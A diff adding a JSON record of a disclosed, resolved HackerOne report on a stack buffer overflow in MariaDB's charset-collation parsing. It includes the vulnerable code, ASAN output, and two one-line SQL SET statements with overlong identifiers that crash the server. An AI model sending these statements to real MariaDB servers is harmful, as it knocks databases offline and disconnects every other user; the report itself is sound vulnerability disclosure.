@@ -1,0 +1,108 @@
+{
+  "id": 3782405,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzgyNDA1",
+  "url": "https://hackerone.com/reports/3782405",
+  "title": "Stack Buffer-Overflow in MariaDB Charset_collation_map_st::insert_or_replace()",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-04T15:52:02.642Z",
+  "submitted_at": "2026-06-04T15:52:03.199Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukas_kupczyk",
+    "url": "/lukas_kupczyk",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-15T09:39:00.905Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-15T08:05:07.484Z",
+  "team_member_agreed_on_going_public_at": "2026-09-15T09:39:00.620Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:** \n\nStack-based buffer overflow in MariaDB Server's `Charset_collation_map_st::insert_or_replace()` function in `sql/charset_collations.cc`. The function copies user-supplied charset and collation identifiers into fixed-size stack buffers (33 and 65 bytes respectively) using `strmake()` with the attacker-controlled token length as the size bound instead of the destination buffer size. Any authenticated user can crash the entire mariadbd process with a single `SET @@session.character_set_collations` statement containing an overlong identifier.\n\nCode path: `SET` statement \\-\\> `Sys_var_charset_collation_map::do_check()` \\-\\> `charset_collation_map_from_item()` \\-\\> `from_text()` \\-\\> `insert_or_replace()` \\-\\> `strmake()`\n\nThe vulnerable function in `sql/charset_collations.cc`:\n\n```c\nbool Charset_collation_map_st::insert_or_replace(const LEX_CSTRING &cs_name,\n                                                  const LEX_CSTRING &cl_name,\n                                                  bool error_on_unknown,\n                                                  myf utf8_flag)\n{\n  // Line 57-58: charset_name buffer overflow\n  char charset_name_c[MY_CS_CHARACTER_SET_NAME_SIZE + 1];  // 33 bytes\n  strmake(charset_name_c, cs_name.str, cs_name.length);    // VULNERABLE: length is unbounded\n\n  // ...\n\n  // Line 67-68: collation_name buffer overflow\n  char collation_name_c[MY_CS_COLLATION_NAME_SIZE + 1];    // 65 bytes\n  strmake(collation_name_c, cl_name.str, cl_name.length);  // VULNERABLE: length is unbounded\n}\n```\n\nThe unbounded tokenizer in `sql/simple_tokenizer.h`:\n\n```c\nLEX_CSTRING get_ident() {\n  const char *start= m_ptr++;\n  for ( ; is_ident_body(); m_ptr++) { }   // unbounded scan over [A-Za-z0-9_]\n  return {start, (size_t)(m_ptr - start)};\n}\n```\n\n**Reproduction Steps:** \n\n1. Connect to a MariaDB server (version 11.2.1 or later) as any authenticated user — even one with only USAGE privilege.  \n     \n2. Variant 1 — overflow charset\\_name\\_c\\[33\\] via a 200-character charset name:\n\n```sql\nSET @@session.character_set_collations='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=x';\n```\n\n3. Variant 2 — overflow collation\\_name\\_c\\[65\\] via a 200-character collation name:\n\n```sql\nSET @@session.character_set_collations='utf8mb3=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';\n```\n\n4. Both variants crash the entire mariadbd process immediately. The client receives: `ERROR 2013 (HY000): Lost connection to server during query`. All other connected clients lose their sessions simultaneously.  \n     \n5. On ASAN builds, the error log will contain:\n\n```\n==230437==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x77bd5379eca1\nWRITE of size 1 at 0x77bd5379eca1 thread T13\n    #0 strmake /home/ubuntu/mariadb-server/strings/strmake.c:36\n    #1 Charset_collation_map_st::insert_or_replace(...) /home/ubuntu/mariadb-server/sql/charset_collations.cc:58\n```\n\n## Impact\n\nAny authenticated user (USAGE-only privilege is sufficient) can crash the entire mariadbd process with a single SQL statement, disconnecting all clients and rolling back in-flight transactions.\n\nOn builds without stack protectors (e.g. custom builds, older distro packages, or platforms where -fstack-protector is not the default), the stack overflow may be exploitable for code execution. The overflow payload is limited to `[A-Za-z0-9_]` by the tokenizer, which constrains but does not necessarily prevent exploitation depending on the target architecture.",
+  "weakness": {
+    "id": 4,
+    "name": "Stack Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-15T08:05:07.776Z",
+  "allow_singular_disclosure_after": 2582059.471996283,
+  "singular_disclosure_allowed": false,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 10336,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Data corruption, exfiltration, disclosure",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
